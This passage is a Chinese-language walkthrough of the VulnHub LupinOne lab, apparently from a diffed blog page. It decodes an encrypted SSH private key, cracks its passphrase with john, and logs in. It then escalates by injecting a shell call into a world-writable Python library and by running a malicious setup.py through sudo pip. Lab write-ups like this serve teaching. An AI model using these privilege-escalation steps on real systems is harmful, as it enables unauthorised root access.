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</code></pre><p>经过BASE解密，获得如下内容：</p>
+<pre tabindex="0"><code>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp
+PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk
+9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9
+H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6
+xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7
+J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu
+/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0
+ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I
+he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf
+XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA
+hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb
+4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq
+mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp
+MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA
+2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb
+QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE
+vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ
+0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft
+rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB
+QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy
+x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG
+nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5
+VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO
+cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh
+nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm
+8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH
+zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw
+n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl
+AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93
+oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI
+63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV
+y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+
+t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2
+Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU
+yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI
+8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU
+mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r
+VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ
+E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ
+BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2
+yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+
+wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P
+5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8
+vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ
+Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB
+1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB
+ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC
+iUJ66WmRUN9EoVlkeCzQJwivI=
+-----END OPENSSH PRIVATE KEY-----</code></pre><p>将内容放入<code>/home/kali/Desktop/upfine</code>文件内，接着<code>python3 /usr/share/john/ssh2john.py /home/kali/Desktop/vulnhub/upfine &gt; passwd</code>，这一步是调用python3执行kali自带的<code>ssh2john</code>脚本（专门用来处理加密SSH私钥的工具），将原始私钥文件<code>upfine</code>重定向到passwd</p>
+<p>接着使用fasttrack进行密码爆破
 <code>john --wordlist=/usr/share/wordlists/fasttrack.txt passwd</code>
-获得密码<code>P@55w0rd!</code></p><h1 id=三ssh登录>三、SSH登录<a class=anchor href=#%e4%b8%89ssh%e7%99%bb%e5%bd%95>#</a></h1><p>赋予upfine文件600权限<code>chomod 600 upfine</code>
+获得密码<code>P@55w0rd!</code></p>
+<h1 id="三ssh登录">三、SSH登录<a class="anchor" href="#%e4%b8%89ssh%e7%99%bb%e5%bd%95">#</a></h1>
+<p>赋予upfine文件600权限<code>chomod 600 upfine</code>
 再使用<code>ssh icex64@192.168.174.132 -i upfine</code>进行ssh登录，输入密码<code>P@55w0rd!</code>即可登录成功
-发现<code>user.txt</code>，获得第一个flag<code>3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}</code></p><h1 id=四水平越权>四、水平越权<a class=anchor href=#%e5%9b%9b%e6%b0%b4%e5%b9%b3%e8%b6%8a%e6%9d%83>#</a></h1><h3 id=41-找漏洞>4.1 找漏洞<a class=anchor href=#41-%e6%89%be%e6%bc%8f%e6%b4%9e>#</a></h3><p>使用<code>sudo -l</code>发现查看过<code>heist.py</code>这一文件，</p><p>命令1，<code>uid=1001(icex64)</code>说明现在是普通用户</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>icex64@LupinOne:~$ id
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span><span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>icex64<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>icex64<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>1001<span style=color:#ff7b72;font-weight:700>(</span>icex64<span style=color:#ff7b72;font-weight:700>)</span></span></span></code></pre></div><p>命令2，<code>(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</code>说明可以以arsene身份无密码执行<code>python3.9 /home/arsene/heist.py</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>icex64@LupinOne:~$ sudo -l
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>Matching Defaults entries <span style=color:#ff7b72>for</span> icex64 on LupinOne:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>    env_reset, mail_badpass, <span style=color:#79c0ff>secure_path</span><span style=color:#ff7b72;font-weight:700>=</span>/usr/local/sbin<span style=color:#79c0ff>\:</span>/usr/local/bin<span style=color:#79c0ff>\:</span>/usr/sbin<span style=color:#79c0ff>\:</span>/usr/bin<span style=color:#79c0ff>\:</span>/sbin<span style=color:#79c0ff>\:</span>/bin
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>User icex64 may run the following commands on LupinOne:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>    <span style=color:#ff7b72;font-weight:700>(</span>arsene<span style=color:#ff7b72;font-weight:700>)</span> NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py</span></span></code></pre></div><p>命令3，查看<code>heist.py</code>内容，它导入<code>webbrowsr</code>模块，打印一句话，接着调用<code>webbrowser.open()</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>icex64@LupinOne:~$ cd /home/arsene
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>icex64@LupinOne:/home/arsene$ cat heist.py
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>import webbrowser
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>print <span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;Its not yet ready to get in action&#34;</span><span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">7</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">8</span><span>webbrowser.open<span style=color:#ff7b72;font-weight:700>(</span><span style=color:#a5d6ff>&#34;https://empirecybersecurity.co.mz&#34;</span><span style=color:#ff7b72;font-weight:700>)</span></span></span></code></pre></div><p>命令4，循着上面的思路，寻找名为<code>webbrowser的文件</code>，找到了两个相关的，第一个的<code>.py</code>文件直接相关</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>icex64@LupinOne:/home/arsene$ find /usr/ -name *webbrowser*
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>/usr/lib/python3.9/webbrowser.py
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>/usr/lib/python3.9/__pycache__/webbrowser.cpython-39.pyc</span></span></code></pre></div><p>命令5，这个文件权限是<code>777</code>，任何人都可以修改，这是漏洞点</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>icex64@LupinOne:/home/arsene$ ls -al /usr/lib/python3.9/webbrowser.py
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>-rwxrwxrwx <span style=color:#a5d6ff>1</span> root root <span style=color:#a5d6ff>24087</span> Oct  <span style=color:#a5d6ff>4</span>  <span style=color:#a5d6ff>2021</span> /usr/lib/python3.9/webbrowser.py</span></span></code></pre></div><h3 id=42-漏洞利用文件源码中添加命令行>4.2 漏洞利用：文件源码中添加命令行<a class=anchor href=#42-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%96%87%e4%bb%b6%e6%ba%90%e7%a0%81%e4%b8%ad%e6%b7%bb%e5%8a%a0%e5%91%bd%e4%bb%a4%e8%a1%8c>#</a></h3><p>接着修改webbrowser.py文件，添加一行启动bash窗口的命令，接着用<code>arsene</code>账户调用<code>heist.py</code>，获取arsene权限</p><p>按o进入插入模式并在新的一行输入，os.system("/bin/bash")，按esc，再:wq保存退出</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>cd /usr/lib/python3.9
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>vi webbrowser.py</span></span></code></pre></div><p>以<code>arsene</code>身份，执行<code>heist.py</code>文件，整个进程身份变成<code>arsene</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>icex64@LupinOne:/usr/lib/python3.9$ sudo -u arsene python3.9 /home/arsene/heist.py
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>arsene@LupinOne:/usr/lib/python3.9$ id
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span><span style=color:#79c0ff>uid</span><span style=color:#ff7b72;font-weight:700>=</span>1000<span style=color:#ff7b72;font-weight:700>(</span>arsene<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>gid</span><span style=color:#ff7b72;font-weight:700>=</span>1000<span style=color:#ff7b72;font-weight:700>(</span>arsene<span style=color:#ff7b72;font-weight:700>)</span> <span style=color:#79c0ff>groups</span><span style=color:#ff7b72;font-weight:700>=</span>1000<span style=color:#ff7b72;font-weight:700>(</span>arsene<span style=color:#ff7b72;font-weight:700>)</span>,24<span style=color:#ff7b72;font-weight:700>(</span>cdrom<span style=color:#ff7b72;font-weight:700>)</span>,25<span style=color:#ff7b72;font-weight:700>(</span>floppy<span style=color:#ff7b72;font-weight:700>)</span>,29<span style=color:#ff7b72;font-weight:700>(</span>audio<span style=color:#ff7b72;font-weight:700>)</span>,30<span style=color:#ff7b72;font-weight:700>(</span>dip<span style=color:#ff7b72;font-weight:700>)</span>,44<span style=color:#ff7b72;font-weight:700>(</span>video<span style=color:#ff7b72;font-weight:700>)</span>,46<span style=color:#ff7b72;font-weight:700>(</span>plugdev<span style=color:#ff7b72;font-weight:700>)</span>,109<span style=color:#ff7b72;font-weight:700>(</span>netdev<span style=color:#ff7b72;font-weight:700>)</span></span></span></code></pre></div><h1 id=五提权>五、提权<a class=anchor href=#%e4%ba%94%e6%8f%90%e6%9d%83>#</a></h1><p>查看当前用户可用sudo执行什么</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>arsene@LupinOne:/usr/lib/python3.9$ sudo -l
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>Matching Defaults entries <span style=color:#ff7b72>for</span> arsene on LupinOne:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>    env_reset, mail_badpass, <span style=color:#79c0ff>secure_path</span><span style=color:#ff7b72;font-weight:700>=</span>/usr/local/sbin<span style=color:#79c0ff>\:</span>/usr/local/bin<span style=color:#79c0ff>\:</span>/usr/sbin<span style=color:#79c0ff>\:</span>/usr/bin<span style=color:#79c0ff>\:</span>/sbin<span style=color:#79c0ff>\:</span>/bin
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>User arsene may run the following commands on LupinOne:
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">6</span><span>    <span style=color:#ff7b72;font-weight:700>(</span>root<span style=color:#ff7b72;font-weight:700>)</span> NOPASSWD: /usr/bin/pip</span></span></code></pre></div><p>发现可以用root身份执行pip命令，那么用pip的root权限安装一个shell的程序</p><p>先创建一个伪装称python包的目录，接着安装当前目录里的python包
-而echo语句中，</p><ul><li>os.execl理解：<code>os.execl()</code>是用新程序替换当前进程，即pip进行→变成root shell</li><li>参数理解：<code>'/bin/sh'</code>要执行的程序，<code>'sh'</code>程序名，<code>'-c'</code>执行后面的命令，<code> 'sh &lt;$(tty) >$(tty) 2>$(tty)'</code>重定向输入输出</li><li>长参数理解：<code>sh &lt;$(tty) >$(tty) 2>$(tty)</code>是让shell正确绑定当前终端，<code>&lt;$(tty)</code>把输入连接到当前终端，<code>>$(tty)</code>把输出连接到当前终端，<code>2>$(tty)</code>把错误输出连接到当前终端</li></ul><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>mkdir upfine
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>cd upfine
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>echo <span style=color:#a5d6ff>&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span style=color:#ff7b72>$(</span>tty<span style=color:#ff7b72>)</span><span style=color:#a5d6ff> &gt;</span><span style=color:#ff7b72>$(</span>tty<span style=color:#ff7b72>)</span><span style=color:#a5d6ff> 2&gt;</span><span style=color:#ff7b72>$(</span>tty<span style=color:#ff7b72>)</span><span style=color:#a5d6ff>&#39;)&#34;</span> &gt; setup.py
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>sudo pip install .</span></span></code></pre></div><p>接着</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>id
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>ls
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>cd /root
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">4</span><span>ls
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">5</span><span>cat root.txt</span></span></code></pre></div><p>获得flag<code>3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}</code></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div></div><div></div></div><div class="flex flex-wrap justify-between"><span><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-the-planets_earth/ class="flex align-center"><img src=/icons/backward.svg class=book-icon alt=Backward>
-<span>The planets earth</span>
-</a></span><span><a href=/docs/cybersecurity/ctf/ class="flex align-center"><span>CTF</span>
-<img src=/icons/forward.svg class=book-icon alt=Forward></a></span></div><div class=book-comments></div><style>.minimal-round-btn{position:fixed;right:4px;bottom:4px;z-index:9999;width:45px;height:45px;display:flex;align-items:center;justify-content:center;opacity:.2;transition:opacity .3s ease,transform .3s ease}.minimal-round-btn img{width:100%;height:100%;border-radius:50%;object-fit:cover;border:1.5px solid #30363d;background:#0d1117;box-shadow:0 4px 10px rgba(0,0,0,.5)}.minimal-round-btn:hover{opacity:1;transform:scale(1.1)}.minimal-round-btn:hover img{border-color:#58a6ff}@media screen and (max-width:768px){.minimal-round-btn{display:none}}</style><a href=/posts/ class=minimal-round-btn><img src=/donk.png alt=随笔></a><footer class=custom-footer><span class=status-dot></span>
-<span>2026 vnccer <a href=https://creativecommons.org/licenses/by/4.0/ target=_blank class=license-link>CC BY 4.0</a></span></footer><script>function toggleSidebar(){const e=document.querySelector("main.container");e.classList.toggle("sidebar-collapsed");const t=e.classList.contains("sidebar-collapsed");localStorage.setItem("sidebar-collapsed",t)}document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelector("main.container"),i=document.documentElement;localStorage.getItem("sidebar-collapsed")==="true"&&o.classList.add("sidebar-collapsed"),setTimeout(()=>{i.classList.remove("sidebar-collapsed-init")},10);const e=document.querySelectorAll(".book-toc #TableOfContents a"),n=document.querySelectorAll("main article.markdown h1[id], main article.markdown h2[id], main article.markdown h3[id], main article.markdown h4[id]");if(e.length===0||n.length===0)return;let t=!1,s;const a=()=>{e.forEach(n=>{n.addEventListener("click",function(){t=!0,clearTimeout(s),e.forEach(e=>e.classList.remove("active")),this.classList.add("active"),s=setTimeout(()=>{t=!1},800)})})},r=()=>{const s=new IntersectionObserver(n=>{if(t)return;const 